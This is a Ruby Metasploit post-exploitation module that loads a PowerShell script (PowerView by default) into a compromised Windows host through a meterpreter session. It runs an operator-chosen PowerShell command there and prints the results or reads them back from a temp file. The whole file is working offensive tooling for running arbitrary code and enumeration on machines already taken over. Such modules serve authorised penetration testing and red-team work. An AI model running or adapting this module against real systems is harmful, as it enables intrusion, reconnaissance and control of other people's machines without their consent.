##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'json'
require 'zlib'
require 'yajl'
# require 'rex/post/meterpreter/extensions/powershell/powershell'
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => "Muit Manage Powershell load and run function",
                      'Description'  => %q{
        This module will Load a Powershell script and run function in the script over a meterpreter session.
        The user may also enter text substitutions to be made in memory before execution.
        Setting VERBOSE to true will output both the script prior to execution and the results.
      },
                      'License'      => MSF_LICENSE,
                      'Platform'     => ['win',],
                      'SessionTypes' => ['meterpreter'],
                      'Author'       => [
                              'viper',
                      ]
          ))

    register_options(
            [
                    OptString.new('SCRIPT', [true, 'Path to the local Powershell script', ::File.join(Msf::Config.install_root, "scripts", "ps", "PowerView.ps1")]),
                    OptString.new('EXECUTE_STRING', [true, 'powershell string to run,', '']),
            ])

    register_advanced_options(
            [
                    OptEnum.new('OUTFORMAT', [false, 'information output format', 'table', ['table', 'json']]),
                    OptInt.new('TIMEOUT', [false, 'Execution timeout', 60]),
                    OptBool.new('LARGEOUTPUT', [false, 'Write powershell output to file,then download file', false]),
                    OptBool.new('CHECK_FUNCTION', [true, 'check if function exist,do not import script,', true]),
            ])

  end

  def run
    result = {:status => true, :message => nil, :data => nil, :endflag => nil}
    if session.type == "shell"
      result[:status]  = false
      result[:message] = 'Unsupport shell type'
      if datastore['OUTFORMAT'] == 'json'
        json = Yajl::Encoder.encode(result)
        json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
      else
        print_error("Unsupport shell type")
      end
      return
    end

    if File.file?(File.join(Msf::Config.install_root, "scripts", "ps", datastore['SCRIPT']))
      script_path = File.join(Msf::Config.install_root, "scripts", "ps", datastore['SCRIPT'])
    elsif File.file?(datastore['SCRIPT'])
      script_path = datastore['SCRIPT']
    else
      result[:status]  = false
      result[:message] = "#{datastore['SCRIPT']} not found"
      if datastore['OUTFORMAT'] == 'json'
        json = Yajl::Encoder.encode(result)
        json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
      else
        print_error("script not found")
      end
      return
    end

    unless session.platform == "windows"
      result[:status]  = false
      result[:message] = 'linux did not have powershell extensions'
      if datastore['OUTFORMAT'] == 'json'
        json = Yajl::Encoder.encode(result)
        json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
      else
        print_error("linux did not have powershell extensions")
      end
      return
    end


    session.load_powershell
    if session.ext.aliases.has_key?('powershell')
      ps_ext = session.ext.aliases['powershell']
      if datastore['CHECK_FUNCTION']
        checkcode = {code: "Get-Command -Name " + datastore['EXECUTE_STRING']}

        psresult = ps_ext.execute_string(checkcode)
        if psresult.include? "CommandNotFoundException" or psresult.include? "ERROR: Get-Command"
          opts = {file: script_path}


          begin
            loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
          rescue ::Timeout::Error, Rex::TimeoutError
            result[:status]  = false
            result[:message] = 'run script timeout,please set timeout bigger'
            if datastore['OUTFORMAT'] == 'json'
              json = Yajl::Encoder.encode(result)
              json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
              print("#{json}")
            else
              print_error("run script timeout,please set timeout bigger")
            end
            nil
          end
        end
      else
        opts = {file: script_path}
        begin
          loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          result[:status]  = false
          result[:message] = 'run script timeout,please set timeout bigger'
          if datastore['OUTFORMAT'] == 'json'
            json = Yajl::Encoder.encode(result)
            json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
            print("#{json}")
          else
            print_error("run script timeout,please set timeout bigger")
          end
          nil
        end
      end

      if datastore['LARGEOUTPUT']
        filename = get_env('TEMP') + '\\' + Time.now.to_i.to_s

        code = {code: datastore['EXECUTE_STRING'] + "| Out-File " + filename}
        begin
          psresult = ps_ext.execute_string(code, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          result[:status]  = false
          result[:message] = 'run script timeout,please set timeout bigger'
          if datastore['OUTFORMAT'] == 'json'
            json = Yajl::Encoder.encode(result)
            json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
            print("#{json}")
          else
            print_error("run script timeout,please set timeout bigger")
          end
          nil
        end
        psresult = read_file(filename)
        # register_file_for_cleanup(filename)
      else
        code = {code: datastore['EXECUTE_STRING']}
        begin
          psresult = ps_ext.execute_string(code, datastore['TIMEOUT'])
        rescue ::Timeout::Error, Rex::TimeoutError
          result[:status]  = false
          result[:message] = 'run script timeout,please set timeout bigger'
          if datastore['OUTFORMAT'] == 'json'
            json = Yajl::Encoder.encode(result)
            json = json.encode('UTF-8', :invalid => :replace, :replace => "?")
            print("#{json}")
          else
            print_error("run script timeout,please set timeout bigger")
          end
          nil
        end
      end

      if psresult.length > 0
        if datastore['OUTFORMAT'] == 'json'
          result[:status]  = true
          result[:message] = ""
          result[:data]    = psresult

          print("#{JSON.generate(result)}")
        else

          print("#{psresult}")
        end
      else
        if datastore['OUTFORMAT'] == 'json'
          result[:status]  = true
          result[:message] = 'there are no output for script!'
          json             = Yajl::Encoder.encode(result)
          json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
          print("#{json}")
        else
          print_warning("there are no output for script")
        end
      end
    else
      if datastore['OUTFORMAT'] == 'json'
        result[:status]  = false
        result[:message] = 'powershell extensions load failed!'
        json             = Yajl::Encoder.encode(result)
        json             = json.encode('UTF-8', :invalid => :replace, :replace => "?")
        print("#{json}")
      else
        print_error('powershell extensions load failed!')
      end
    end
  end
end

